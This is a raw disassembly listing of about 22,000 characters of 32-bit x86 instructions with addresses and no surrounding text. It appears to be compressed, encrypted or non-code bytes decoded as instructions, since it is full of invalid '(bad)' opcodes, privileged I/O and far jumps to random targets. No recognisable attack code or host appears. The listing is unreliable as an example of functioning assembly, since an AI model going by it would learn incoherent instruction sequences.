  41fb33:	or     eax,0xdd3eef11
  41fb38:	jmp    0x41faea
  41fb3a:	xor    eax,0xd259037c
  41fb3f:	fld    TBYTE PTR [edx-0x5]
  41fb42:	jle    0x41fb9c
  41fb44:	xor    bh,bl
  41fb46:	mov    edi,0x4e34633c
  41fb4b:	ins    BYTE PTR es:[edi],dx
  41fb4c:	jmp    0x41fb0a
  41fb4e:	xchg   edx,eax
  41fb4f:	fs cdq 
  41fb51:	repz add al,BYTE PTR [esi+edx*4-0x19a5f222]
  41fb59:	xchg   ebp,eax
  41fb5a:	stos   BYTE PTR es:[edi],al
  41fb5b:	or     ebx,esp
  41fb5d:	inc    edi
  41fb5e:	sbb    dl,dl
  41fb60:	jmp    0x41e2:0xe518a921
  41fb67:	or     DWORD PTR [eax+0x73e99cd8],edx
  41fb6d:	(bad)  
  41fb6f:	rcr    DWORD PTR [ebp+eiz*4-0x44],0x71
  41fb74:	in     eax,dx
  41fb75:	sub    al,0x2a
  41fb77:	and    dh,ah
  41fb79:	mov    bh,0x73
  41fb7b:	pop    edi
  41fb7c:	adc    bh,BYTE PTR [ebx-0x33]
  41fb7f:	mov    ch,0xe0
  41fb81:	dec    esp
  41fb82:	mov    ds:0xbe56f3c8,al
  41fb87:	(bad)  
  41fb88:	(bad)  
  41fb8a:	(bad)  [ebx+0x7c585feb]
  41fb90:	jmp    0x11ea512f
  41fb95:	or     DWORD PTR [eax+0x9cd6674],esp
  41fb9b:	and    al,0xbe
  41fb9d:	adc    BYTE PTR [ebp-0x78],dh
  41fba0:	xor    BYTE PTR [edx+0x78],ch
  41fba3:	retf   
  41fba4:	jmp    0x41fb46
  41fba6:	ror    DWORD PTR [edx],1
  41fba8:	retf   
  41fba9:	or     esp,ebx
  41fbab:	pop    es
  41fbac:	add    edx,ecx
  41fbae:	jp     0x41fb78
  41fbb0:	xchg   esi,eax
  41fbb1:	fdiv   DWORD PTR [ecx+0x31f98ba9]
  41fbb7:	loopne 0x41fba4
  41fbb9:	dec    eax
  41fbba:	mov    eax,0xe32f4b38
  41fbbf:	jp     0x41fc05
  41fbc1:	or     ebp,DWORD PTR [ecx+0x71c56e94]
  41fbc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbc8:	push   cs
  41fbc9:	inc    ebx
  41fbca:	sbb    eax,0xb57d9dcc
  41fbcf:	sub    al,0xe6
  41fbd2:	cmp    BYTE PTR [eax-0x1a],cl
  41fbd5:	pop    eax
  41fbd6:	mov    ebp,0x9d2ff6a
  41fbdb:	enter  0x100b,0xa4
  41fbdf:	scas   eax,DWORD PTR es:[edi]
  41fbe0:	imul   DWORD PTR [esi+0x28eb6f03]
  41fbe6:	dec    ebx
  41fbe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbe8:	(bad)  
  41fbe9:	(bad)  
  41fbea:	mov    edx,0xb6dc5f2d
  41fbef:	and    eax,0xe15bf620
  41fbf4:	sub    esp,DWORD PTR [ebp-0x79140150]
  41fbfa:	inc    eax
  41fbfb:	xchg   ebp,eax
  41fbfc:	and    ebx,edx
  41fbfe:	loope  0x41fba3
  41fc00:	jno    0x41fbc1
  41fc02:	imul   esp,DWORD PTR [esi+0x4fce398e],0x5f7de4eb
  41fc0c:	leave  
  41fc0d:	cmp    eax,0xd9e0e001
  41fc12:	push   edi
  41fc13:	sub    bh,bl
  41fc15:	test   DWORD PTR ds:0x154f76e9,ebx
  41fc1b:	pusha  
  41fc1c:	jmp    0xc47d292a
  41fc21:	loop   0x41fbe5
  41fc23:	dec    ebx
  41fc24:	or     ebx,ebp
  41fc26:	fmul   DWORD PTR [edi]
  41fc28:	pop    esi
  41fc29:	or     al,0xe8
  41fc2b:	(bad)  
  41fc2c:	dec    esi
  41fc2d:	ret    
  41fc2e:	ins    DWORD PTR es:[edi],dx
  41fc2f:	retf   0xc867
  41fc32:	sbb    ebx,DWORD PTR [edx-0xe]
  41fc35:	mov    esp,ds
  41fc37:	or     BYTE PTR [eax],dl
  41fc39:	fistp  QWORD PTR [edx-0x100c3805]
  41fc3f:	(bad)  
  41fc40:	mov    bh,0x9a
  41fc42:	stos   DWORD PTR es:[edi],eax
  41fc43:	mov    ds:0x84ba9504,al
  41fc48:	jmp    0x3f51:0xea5b1401
  41fc4f:	and    bl,ah
  41fc51:	fimul  WORD PTR [edx]
  41fc53:	enter  0x5b1e,0x6
  41fc57:	mov    ss,WORD PTR [ebx+ebp*4]
  41fc5a:	stc    
  41fc5b:	mov    ebp,0xb17d45eb
  41fc60:	hlt    
  41fc61:	fld    DWORD PTR [edi]
  41fc63:	aaa    
  41fc64:	pop    eax
  41fc65:	fsub   st(5),st
  41fc67:	sbb    BYTE PTR [ebp-0x37],0x12
  41fc6b:	xor    eax,0x6c62816b
  41fc70:	out    0xbf,eax
  41fc72:	adc    DWORD PTR [eax],0xa
  41fc75:	xor    DWORD PTR [ebp+0x632e95a3],edi
  41fc7b:	enter  0xfe5a,0x5b
  41fc7f:	popa   
  41fc80:	lods   al,BYTE PTR ds:[esi]
  41fc81:	add    ah,BYTE PTR [ebx]
  41fc83:	(bad)  
  41fc84:	jmp    0x41fcda
  41fc86:	jp     0x41fc7c
  41fc88:	lahf   
  41fc89:	into   
  41fc8a:	jg     0x41fcf2
  41fc8c:	pop    edi
  41fc8d:	(bad)  
  41fc8f:	test   DWORD PTR [ebx],esi
  41fc91:	enter  0x4f83,0xb
  41fc95:	repz loope 0x41fc67
  41fc98:	in     al,dx
  41fc99:	cld    
  41fc9a:	test   al,0x8c
  41fc9c:	shr    DWORD PTR [esi+0x75],cl
  41fc9f:	hlt    
  41fca0:	jp     0x12c8c500
  41fca6:	sub    ah,cl
  41fca8:	(bad)  
  41fca9:	popf   
  41fcaa:	mov    esp,0x6422eb77
  41fcaf:	mov    ds:0xef8e1b5b,eax
  41fcb4:	loop   0x41fc92
  41fcb6:	retf   0x67b7
  41fcb9:	xchg   esp,eax
  41fcba:	adc    bl,BYTE PTR [eax-0x5851257d]
  41fcc0:	jmp    0x41fd19
  41fcc2:	in     al,dx
  41fcc3:	ja     0x41fcdb
  41fcc5:	jmp    0xf927:0x72ea13e
  41fccc:	add    edi,esp
  41fcce:	mov    dh,0x7e
  41fcd0:	push   0xffffffbf
  41fcd2:	add    BYTE PTR [ecx-0x53827a52],bh
  41fcd8:	icebp  
  41fcd9:	int    0x8d
  41fcdb:	pop    edi
  41fcdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcdd:	fsubp  st(6),st
  41fcdf:	popf   
  41fce0:	inc    BYTE PTR [ecx+0x4f57e138]
  41fce6:	mov    eax,0xf5adebb3
  41fceb:	sub    eax,DWORD PTR [edx-0x6f0df330]
  41fcf1:	push   ecx
  41fcf2:	dec    esp
  41fcf3:	enter  0x426d,0xc9
  41fcf7:	cmp    al,0x87
  41fcf9:	adc    al,0x90
  41fcfb:	pop    esi
  41fcfc:	jmp    0xcf05:0x6584bca9
  41fd03:	cmp    edi,DWORD PTR [ebx+0x4f]
  41fd06:	xor    al,0xa3
  41fd08:	pop    edx
  41fd09:	fild   WORD PTR ds:0x9004104
  41fd0f:	push   edi
  41fd10:	jge    0x41fcda
  41fd12:	cld    
  41fd13:	out    0xc2,eax
  41fd15:	mov    eax,0x52b7dda5
  41fd1a:	push   0xffffffc8
  41fd1c:	sbb    edx,DWORD PTR [edi]
  41fd1e:	dec    edi
  41fd1f:	retf   0xd57
  41fd22:	imul   eax,ecx,0xffffff83
  41fd25:	mov    edx,0xcbe26d2b
  41fd2a:	xchg   esp,eax
  41fd2b:	inc    edi
  41fd2c:	pop    ss
  41fd2d:	mov    ah,0xa7
  41fd2f:	mov    dl,0x1a
  41fd31:	int    0xd7
  41fd33:	daa    
  41fd34:	mov    edi,0x7c82078
  41fd39:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41fd3b:	add    ebp,DWORD PTR [ebp-0x146ee41f]
  41fd41:	xchg   ebp,eax
  41fd42:	push   0xffffff96
  41fd44:	adc    ch,BYTE PTR [esi+0x60]
  41fd47:	sbb    ch,BYTE PTR [edx+0x17fededf]
  41fd4d:	call   0xfb32e2e0
  41fd52:	cld    
  41fd53:	retf   
  41fd54:	or     ah,0x47
  41fd57:	or     esi,DWORD PTR [edx]
  41fd59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd5a:	and    eax,0xf4eb3bc8
  41fd5f:	xor    eax,0x432400de
  41fd64:	cwde   
  41fd65:	mov    esi,0x91093cd8
  41fd6a:	std    
  41fd6b:	int3   
  41fd6c:	iret   
  41fd6d:	scas   al,BYTE PTR es:[edi]
  41fd6e:	pop    edi
  41fd6f:	fstp   DWORD PTR [esp+ebx*8]
  41fd72:	clc    
  41fd73:	daa    
  41fd74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd75:	push   es
  41fd76:	jb     0x41fd2a
  41fd78:	jnp    0x41fd97
  41fd7a:	pop    ds
  41fd7b:	loopne 0x41fd68
  41fd7d:	xor    dl,ah
  41fd7f:	in     eax,0x63
  41fd81:	pop    ebx
  41fd82:	mov    eax,0xc0e040ba
  41fd87:	cmp    esi,DWORD PTR [ecx+eiz*4+0x54]
  41fd8b:	enter  0x27a7,0xe8
  41fd8f:	fsub   st(3),st
  41fd91:	test   BYTE PTR [eax+0x71fec88],0xce
  41fd98:	outs   dx,DWORD PTR ds:[esi]
  41fd99:	fistp  QWORD PTR [edi-0x7f]
  41fd9c:	mov    dl,BYTE PTR gs:[esi]
  41fd9f:	sbb    al,0x6c
  41fda1:	pop    eax
  41fda2:	std    
  41fda3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fda4:	fisub  WORD PTR [ecx]
  41fda6:	or     eax,0x26b3078b
  41fdab:	fwait
  41fdac:	sub    al,0xdf
  41fdae:	sub    DWORD PTR [esi+0x2e],esi
  41fdb1:	popa   
  41fdb2:	mov    edi,0x7aac3f
  41fdb7:	scas   al,BYTE PTR es:[edi]
  41fdb8:	add    al,0x6d
  41fdba:	jo     0x41fdaf
  41fdbc:	jnp    0x41fe25
  41fdbe:	jns    0x41fdee
  41fdc0:	xchg   edi,ebx
  41fdc2:	stos   BYTE PTR es:[edi],al
  41fdc3:	(bad)  
  41fdc4:	loopne 0x41fdf1
  41fdc6:	iret   
  41fdc7:	add    al,0xf
  41fdc9:	lds    edx,FWORD PTR [edx+0x2b7deb7a]
  41fdcf:	call   0xd810:0xcc6a7bf6
  41fdd6:	sbb    cl,BYTE PTR [esi+0x65]
  41fdd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdda:	cmp    al,0x4a
  41fddc:	into   
  41fddd:	xor    esi,ecx
  41fddf:	jle    0x41fdcc
  41fde1:	sbb    ebp,DWORD PTR [ebp-0x558362ed]
  41fde7:	pop    edi
  41fde8:	inc    edi
  41fde9:	fdiv   DWORD PTR [ebx+0x79]
  41fdec:	and    eax,0x7f3d7d0d
  41fdf1:	stos   DWORD PTR es:[edi],eax
  41fdf2:	retf   
  41fdf3:	call   0x1478a5e3
  41fdf8:	or     cl,BYTE PTR [esi-0x68]
  41fdfb:	mov    edi,0x2810532d
  41fe00:	xor    DWORD PTR ds:0x44e7c7e1,esi
  41fe06:	idiv   DWORD PTR [ecx-0xa]
  41fe09:	and    DWORD PTR [esi-0x3860147b],edi
  41fe0f:	sub    eax,0xa0af1c41
  41fe14:	push   eax
  41fe15:	or     DWORD PTR [eax+0x10],ebp
  41fe18:	jmp    0x41fe24
  41fe1a:	lahf   
  41fe1b:	xchg   DWORD PTR [edx+0x12],edi
  41fe1e:	fwait
  41fe1f:	push   ebx
  41fe20:	jmp    0x41fdaf
  41fe22:	arpl   WORD PTR [ecx+0x4a],si
  41fe25:	mov    ch,0x4b
  41fe27:	mov    edi,0xc9c2510d
  41fe2c:	ret    0x91ba
  41fe2f:	adc    al,ah
  41fe31:	dec    ebp
  41fe32:	(bad)  
  41fe33:	fmul   DWORD PTR [eax-0x741902ec]
  41fe39:	imul   ebp,DWORD PTR [ebp-0x265a5821],0xc34708c7
  41fe43:	out    0x5b,al
  41fe45:	xchg   edi,eax
  41fe46:	sti    
  41fe47:	jecxz  0x41fe34
  41fe49:	sbb    esp,ebp
  41fe4b:	jp     0x41fe6d
  41fe4d:	add    dl,ah
  41fe4f:	cwde   
  41fe50:	mov    ah,al
  41fe52:	sub    BYTE PTR [ecx-0x10],ch
  41fe55:	out    0x59,al
  41fe57:	mov    ch,cl
  41fe59:	mov    edx,0x891fc709
  41fe5e:	xor    eax,0xfccff085
  41fe63:	sbb    eax,0x38dd65bb
  41fe68:	jle    0x41feaa
  41fe6a:	mov    al,ds:0xe1ef08c7
  41fe6f:	in     al,0xc2
  41fe71:	das    
  41fe72:	jmp    0xfd1f4ecc
  41fe77:	cdq    
  41fe78:	fbstp  TBYTE PTR [ecx]
  41fe7a:	scas   al,BYTE PTR es:[edi]
  41fe7b:	jl     0x41fe92
  41fe7d:	cld    
  41fe7e:	mov    ch,0xc8
  41fe80:	pop    ds
  41fe81:	call   0x6d5d7099
  41fe86:	fs sub eax,0x5fecccfd
  41fe8c:	test   eax,0x154c86b3
  41fe91:	pop    ds
  41fe92:	pop    ds
  41fe93:	jmp    0xb1e3:0x3b35df14
  41fe9a:	repnz xchg ecx,eax
  41fe9c:	mov    bh,BYTE PTR [ebp-0x3]
  41fe9f:	pop    ebp
  41fea0:	in     eax,0xa4
  41fea2:	cmp    ch,BYTE PTR [eax]
  41fea4:	push   es
  41fea5:	mov    ?,WORD PTR [ebx-0x242b8b35]
  41feab:	dec    ecx
  41feac:	xor    dh,ah
  41feae:	lods   al,BYTE PTR ds:[esi]
  41feaf:	bound  ebp,QWORD PTR [ebp+ebp*4+0x799d09fd]
  41feb6:	adc    edi,edx
  41feb8:	repz shl DWORD PTR [edx+ebp*2+0x51b4dcae],1
  41fec0:	xchg   ebx,eax
  41fec1:	dec    BYTE PTR [ebx-0x20]
  41fec4:	ins    BYTE PTR es:[edi],dx
  41fec5:	scas   al,BYTE PTR es:[edi]
  41fec6:	retf   
  41fec7:	adc    BYTE PTR [eax+0x5d],dh
  41feca:	std    
  41fecb:	jae    0x41fe9e
  41fecd:	xor    ecx,edx
  41fecf:	aas    
  41fed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fed1:	mov    eax,0xe604c838
  41fed6:	sub    BYTE PTR [esi+edi*1+0x25],ah
  41feda:	lahf   
  41fedb:	jg     0x41fec4
  41fedd:	inc    esi
  41fede:	scas   eax,DWORD PTR es:[edi]
  41fedf:	test   eax,0xbbbc97bd
  41fee4:	mov    bh,BYTE PTR [esi-0x7b]
  41fee7:	enter  0x5dcd,0x7e
  41feeb:	mov    WORD PTR [eax],?
  41feed:	mov    dh,BYTE PTR es:[ebx-0x15]
  41fef1:	sbb    BYTE PTR [ebx+0x5],0x3f
  41fef5:	mov    cl,ch
  41fef7:	mov    cl,0x2f
  41fef9:	ficomp WORD PTR [eax]
  41fefb:	mov    al,bl
  41fefd:	push   es
  41fefe:	js     0x41ff69
  41ff00:	cmp    edi,DWORD PTR fs:[ecx+0x8eb77]
  41ff07:	loopne 0x41feb1
  41ff09:	sahf   
  41ff0a:	add    DWORD PTR [ebp+ebp*1-0x21],eax
  41ff0e:	stos   DWORD PTR es:[edi],eax
  41ff0f:	mov    edx,0x7203a048
  41ff14:	mov    ebx,0x5a3efd44
  41ff19:	sar    BYTE PTR [ecx],cl
  41ff1b:	clc    
  41ff1c:	mov    al,ds:0x6ec7ef78
  41ff21:	fimul  DWORD PTR [esi-0x45]
  41ff24:	int    0x48
  41ff26:	pop    eax
  41ff27:	call   0xbd39:0x17c830eb
  41ff2e:	xor    al,0x99
  41ff30:	loopne 0x41ff12
  41ff32:	std    
  41ff33:	and    bh,dh
  41ff35:	(bad)  
  41ff36:	jbe    0x41ff30
  41ff38:	pop    eax
  41ff39:	inc    esi
  41ff3a:	mov    dl,dh
  41ff3c:	jmp    0x41ff5c
  41ff3e:	in     al,dx
  41ff3f:	dec    edx
  41ff40:	push   esi
  41ff41:	ds mov ebx,0x8df1a0a
  41ff47:	xor    al,0x5d
  41ff49:	int3   
  41ff4a:	stos   DWORD PTR es:[edi],eax
  41ff4b:	addr16 cmp eax,0xfffffffc
  41ff4f:	inc    ecx
  41ff50:	mov    bl,bl
  41ff52:	(bad)  
  41ff53:	in     al,dx
  41ff54:	scas   eax,DWORD PTR es:[edi]
  41ff55:	jle    0x41feef
  41ff57:	js     0x41fee5
  41ff59:	aaa    
  41ff5a:	xchg   esi,eax
  41ff5b:	enter  0x6b8f,0x30
  41ff5f:	in     eax,0x0
  41ff61:	pop    eax
  41ff62:	sbb    al,0xf7
  41ff64:	jmp    0x41ff56
  41ff66:	push   0x74
  41ff68:	aam    0x7b
  41ff6a:	pop    edi
  41ff6b:	les    ecx,FWORD PTR [ecx+0x58ad0a03]
  41ff71:	in     al,dx
  41ff72:	adc    al,0xd1
  41ff74:	ret    0x7e3a
  41ff77:	(bad)  [edx+0x65fc004e]
  41ff7d:	mov    eax,DWORD PTR [eax]
  41ff7f:	in     eax,dx
  41ff80:	in     al,dx
  41ff81:	jmp    0x2f7a6c46
  41ff86:	push   es
  41ff87:	ret    
  41ff88:	out    0xdf,eax
  41ff8a:	mov    dh,0x9d
  41ff8c:	pop    ecx
  41ff8d:	and    al,BYTE PTR [ecx]
  41ff8f:	xor    DWORD PTR [ecx],ebx
  41ff91:	nop
  41ff92:	add    BYTE PTR [esi],cl
  41ff94:	mov    al,0x31
  41ff96:	mov    esp,0x5a174e04
  41ff9b:	dec    esp
  41ff9d:	ficom  WORD PTR [ebp+0x26]
  41ffa0:	in     eax,dx
  41ffa1:	xchg   esp,eax
  41ffa2:	and    dl,al
  41ffa4:	icebp  
  41ffa5:	inc    ebx
  41ffa6:	inc    ecx
  41ffa7:	ja     0x41ff94
  41ffa9:	adc    eax,ecx
  41ffab:	loopne 0x41ff85
  41ffad:	or     al,BYTE PTR [ebx+ebp*4]
  41ffb0:	out    dx,al
  41ffb1:	loope  0x41ff86
  41ffb3:	jmp    0xad070099
  41ffb8:	jmp    0x41ffd2
  41ffba:	cli    
  41ffbb:	xchg   ebx,eax
  41ffbc:	jno    0x41ff5e
  41ffbe:	test   dh,al
  41ffc0:	jns    0x41ff9e
  41ffc2:	or     ebp,DWORD PTR [ebp+0x74c05dd]
  41ffc8:	or     ebx,DWORD PTR [ecx+0x2e]
  41ffcb:	sub    DWORD PTR [edi-0x6537c338],0x2e0ec631
  41ffd5:	mov    eax,0xbe74c818
  41ffda:	cdq    
  41ffdb:	add    al,0x77
  41ffdd:	and    al,BYTE PTR [edx+eax*8]
  41ffe0:	jmp    0x41ff8a
  41ffe2:	or     eax,0xd4577dc0
  41ffe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffe8:	test   BYTE PTR [edi-0x13f37ff],0x9c
  41ffef:	dec    ebp
  41fff0:	jmp    0xee37bd3e
  41fff5:	mov    edi,ebx
  41fff7:	pop    edi
  41fff8:	jg     0x41ffd9
  41fffa:	fstp   TBYTE PTR [edi]
  41fffc:	xchg   ebp,eax
  41fffd:	nop
  41fffe:	mov    ah,0xc7
  420000:	in     al,dx
  420001:	out    0x78,al
  420003:	in     al,dx
  420004:	mov    WORD PTR [edi-0x4bd7cf78],ds
  42000a:	cld    
  42000b:	mov    cl,0xa3
  42000d:	shl    edx,0xe2
  420010:	shr    dl,0x4d
  420013:	leave  
  420014:	cmp    ah,BYTE PTR [ecx-0x75e3e82d]
  42001a:	icebp  
  42001b:	test   DWORD PTR [esi],0xdd65ad77
  420021:	xor    bh,dl
  420023:	(bad)  
  420024:	data16 cld 
  420026:	jae    0x41fff7
  420028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420029:	xchg   esi,eax
  42002a:	call   0x2e31:0x5770fec8
  420031:	push   esi
  420032:	lods   al,BYTE PTR ds:[esi]
  420033:	push   edx
  420034:	jmp    0x420038
  420036:	or     eax,0xffc97254
  42003b:	and    ebx,DWORD PTR [ecx-0x24]
  42003e:	pop    eax
  42003f:	in     eax,dx
  420040:	fucom  st(6)
  420042:	(bad)  
  420043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420044:	sub    ecx,esp
  420046:	call   0x29bfdee3
  42004b:	retf   
  42004c:	push   edx
  42004d:	and    DWORD PTR [esi+0x1a],ebx
  420050:	(bad)  
  420051:	ja     0x420032
  420053:	mov    al,ds:0x61cddf5e
  420058:	lahf   
  420059:	mov    ds:0xc0067abb,eax
  42005e:	cld    
  42005f:	repnz add BYTE PTR [ebx+0x70ce18cd],0xd6
  420067:	(bad)  
  420068:	pop    edi
  420069:	xchg   bl,dh
  42006b:	cdq    
  42006c:	mov    ch,0x1b
  42006e:	xchg   ebp,eax
  42006f:	dec    esp
  420070:	jmp    0x420010
  420072:	adc    dh,bh
  420074:	ror    DWORD PTR [ebp+0x3d],1
  420077:	imul   edi,DWORD PTR [ecx-0x21],0x4c
  42007b:	leave  
  42007c:	cwde   
  42007d:	cli    
  42007e:	dec    ebx
  42007f:	dec    edx
  420080:	or     eax,0xec58ad47
  420085:	jne    0x4200c2
  420087:	gs push ds
  420089:	sti    
  42008a:	(bad)  
  42008b:	outs   dx,DWORD PTR ds:[esi]
  42008c:	inc    ecx
  42008d:	mov    edi,0xcc69c417
  420092:	imul   ecx,eax,0xc39e7291
  420098:	xlat   BYTE PTR ds:[ebx]
  420099:	arpl   WORD PTR [edx+0xc5e9543],ax
  42009f:	push   ecx
  4200a0:	test   DWORD PTR [ecx-0x72e7c203],eax
  4200a6:	fst    DWORD PTR [esi+edi*8+0x4f6a2fdf]
  4200ad:	repnz adc BYTE PTR [ecx],bl
  4200b0:	cmc    
  4200b1:	fwait
  4200b2:	cld    
  4200b3:	and    ebx,0xffffffda
  4200b6:	mov    al,0x5f
  4200b8:	cld    
  4200b9:	es adc ah,bl
  4200bc:	(bad)  
  4200bd:	call   0xbcfa:0x55e4a8fc
  4200c4:	arpl   WORD PTR [edi],bp
  4200c6:	std    
  4200c7:	call   0xac3921dc
  4200cc:	or     al,0x81
  4200ce:	fmul   st,st(0)
  4200d0:	xchg   edx,eax
  4200d1:	in     eax,dx
  4200d2:	ins    BYTE PTR es:[edi],dx
  4200d3:	imul   ebx,DWORD PTR [ebp-0x10d36b67],0x5a8ffcae
  4200dd:	jp     0x4200cc
  4200df:	sbb    DWORD PTR [edi],ecx
  4200e1:	dec    esp
  4200e2:	jno    0x4200ac
  4200e4:	xchg   DWORD PTR [edx+edi*8-0x76de6116],esi
  4200eb:	call   0xed0c:0x7f824aeb
  4200f2:	push   ds
  4200f3:	adc    edi,DWORD PTR [ebp+0x12afaaf2]
  4200f9:	pusha  
  4200fa:	std    
  4200fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200fc:	mov    ebx,0xe45ffbbb
  420101:	cmp    al,0xfd
  420103:	jp     0x42011f
  420105:	mov    ds:0x5b2db9c7,eax
  42010a:	addr16 call 0xa86b:0x1bd8040e
  420112:	mov    fs,WORD PTR [esi]
  420114:	jo     0x420126
  420116:	icebp  
  420117:	out    0x9c,al
  420119:	jmp    0x8fd3d11a
  42011e:	xor    al,0x60
  420120:	pop    es
  420121:	lock push edi
  420123:	enter  0xe3c7,0x38
  420127:	xor    esi,DWORD PTR [ecx+0x61]
  42012a:	shl    DWORD PTR [edx-0x15],cl
  42012d:	dec    eax
  42012e:	iret   
  42012f:	mov    dl,0xe0
  420131:	test   ecx,0xf3df9559
  420137:	mov    ah,0x42
  420139:	mov    eax,DWORD PTR [ebp+esi*1+0x72]
  42013d:	inc    ecx
  42013e:	(bad)  
  42013f:	clc    
  420140:	lods   eax,DWORD PTR ds:[esi]
  420141:	out    0xc8,eax
  420143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420144:	sahf   
  420145:	aad    0xb3
  420147:	xor    BYTE PTR [ecx+0x28],al
  42014a:	dec    esi
  42014b:	enter  0xfba3,0xf3
  42014f:	sar    DWORD PTR [edx-0x14338ae5],0xa0
  420156:	sbb    bl,ah
  420158:	and    dl,BYTE PTR [edx-0x204a428a]
  42015e:	aam    0x2e
  420160:	sbb    edi,DWORD PTR [edi+0x7a]
  420163:	mov    BYTE PTR [ecx],ch
  420165:	test   al,0x2f
  420167:	xchg   esp,eax
  420168:	in     al,dx
  420169:	clc    
  42016a:	gs mov al,0xe7
  42016d:	fs aas 
  42016f:	aad    0x37
  420171:	and    dh,cl
  420173:	mov    edx,0xc854b0b0
  420178:	jl     0x420148
  42017a:	int    0xa1
  42017c:	jge    0x420193
  42017e:	std    
  42017f:	mov    ah,0x87
  420181:	(bad)
  420185:	jae    0x420188
  420187:	(bad)  
  420188:	or     ch,BYTE PTR ds:0xaf20f72b
  42018e:	adc    al,0xdc
  420190:	addr16 inc esp
  420192:	std    
  420193:	enter  0x1660,0x39
  420197:	int3   
  420198:	jmp    0x1e21f6c5
  42019d:	mov    al,0xfc
  42019f:	mov    ecx,0x87d38178
  4201a4:	or     ebx,DWORD PTR [eax-0x1f]
  4201a7:	call   0xd172:0x445ddf86
  4201ae:	push   es
  4201af:	sbb    eax,0x6bdedf2c
  4201b4:	push   0x5a
  4201b6:	cmp    al,ah
  4201b8:	enter  0x8cf4,0x88
  4201bc:	in     al,0xc3
  4201be:	mov    edi,0x62379c48
  4201c3:	or     BYTE PTR [edi-0x4f425a47],cl
  4201c9:	outs   dx,BYTE PTR ds:[esi]
  4201ca:	in     al,dx
  4201cb:	(bad)  
  4201cc:	retf   0x5b3f
  4201cf:	pop    eax
  4201d0:	idiv   BYTE PTR [ecx+0x6f]
  4201d3:	cld    
  4201d4:	jmp    0x420229
  4201d6:	out    dx,eax
  4201d7:	pop    eax
  4201d8:	shl    DWORD PTR ds:0xea0c33f8,0x8
  4201df:	scas   al,BYTE PTR es:[edi]
  4201e0:	adc    al,0x5f
  4201e2:	push   edi
  4201e3:	lods   eax,DWORD PTR ds:[esi]
  4201e4:	jo     0x4201af
  4201e6:	pop    ebx
  4201e7:	gs jmp 0xae81:0xee61cd46
  4201ef:	clc    
  4201f0:	xchg   esp,eax
  4201f1:	icebp  
  4201f2:	ins    BYTE PTR es:[edi],dx
  4201f3:	mov    esp,0x88584289
  4201f8:	in     al,dx
  4201f9:	sbb    eax,0xcf64e057
  4201fe:	mov    al,ds:0x91a9e89b
  420203:	adc    eax,0x9fbccbcd
  420208:	js     0x4201fc
  42020a:	inc    ebx
  42020b:	enter  0xfbd9,0x90
  42020f:	adc    al,BYTE PTR [esi+0x4bd840e7]
  420215:	cmp    BYTE PTR [edx],0xc1
  420218:	jmp    0xa11:0x2775641f
  42021f:	cmp    BYTE PTR [edx+0x6],bl
  420222:	enter  0xafc8,0xf1
  420226:	popa   
  420227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420228:	sub    cl,BYTE PTR [ecx+ebx*4]
  42022b:	imul   bl
  42022d:	adc    cl,ch
  42022f:	adc    eax,0xa75eb13
  420234:	aaa    
  420235:	fbstp  TBYTE PTR [ebx+eiz*4+0x25]
  420239:	jmp    0x6e6c9ddb
  42023e:	(bad)  
  42023f:	jne    0x420289
  420241:	enter  0x1042,0xda
  420245:	lods   al,BYTE PTR ds:[esi]
  420246:	les    edx,FWORD PTR [ecx-0x36da0e34]
  42024c:	dec    edx
  42024d:	cmp    ebp,DWORD PTR [edi+0xedd7fcf]
  420253:	enter  0x6cc3,0x7b
  420257:	jb     0x4201f7
  420259:	inc    ecx
  42025a:	dec    eax
  42025b:	enter  0x393c,0xd2
  42025f:	push   0xc65593f3
  420264:	in     al,dx
  420265:	cmc    
  420266:	add    bh,ch
  420268:	and    edi,ebx
  42026a:	pop    esi
  42026b:	cld    
  42026c:	jnp    0x62c4ce36
  420272:	sub    ah,dl
  420274:	ror    BYTE PTR [ebx-0x6b],1
  420277:	daa    
  420278:	xchg   edi,eax
  420279:	aas    
  42027a:	(bad)  
  42027b:	cmp    ebp,DWORD PTR [esi-0x61]
  42027e:	test   al,0x6f
  420280:	xor    ch,BYTE PTR [edx-0x43]
  420283:	mov    ecx,0x3936dff4
  420288:	aam    0xf9
  42028a:	arpl   cx,bx
  42028c:	mov    al,ds:0xa99fd50
  420291:	mov    cl,0x1d
  420293:	and    cl,BYTE PTR [edx+ecx*2+0x7b]
  420297:	call   0x4bee:0x7738de06
  42029e:	call   0x9f615262
  4202a3:	ss jmp 0x420302
  4202a6:	push   es
  4202a7:	pop    edi
  4202a8:	out    0xdc,eax
  4202aa:	and    cl,BYTE PTR [ebp-0x5e79206a]
  4202b0:	and    eax,0x1659c92b
  4202b5:	mov    dh,0x1
  4202b7:	aad    0x7c
  4202b9:	cmp    al,0xa3
  4202bb:	dec    eax
  4202bc:	add    dl,bh
  4202be:	push   edi
  4202bf:	popf   
  4202c0:	xchg   ebp,eax
  4202c1:	in     al,dx
  4202c2:	outs   dx,DWORD PTR ds:[esi]
  4202c3:	enter  0xee4a,0xa3
  4202c7:	adc    BYTE PTR [eax+ebx*2+0x78fd5927],dh
  4202ce:	sbb    esi,ebp
  4202d0:	jmp    0x4202ca
  4202d2:	adc    al,BYTE PTR [ecx+ebx*8+0x56]
  4202d6:	sub    eax,0x14e383a0
  4202db:	out    0xd4,al
  4202dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202de:	and    DWORD PTR [eax+0x13],ecx
  4202e1:	push   edi
  4202e2:	mov    ds:0x933febbd,eax
  4202e7:	dec    eax
  4202e8:	fdivrp st(3),st
  4202ea:	adc    DWORD PTR [ebp+ebp*8+0x9],esp
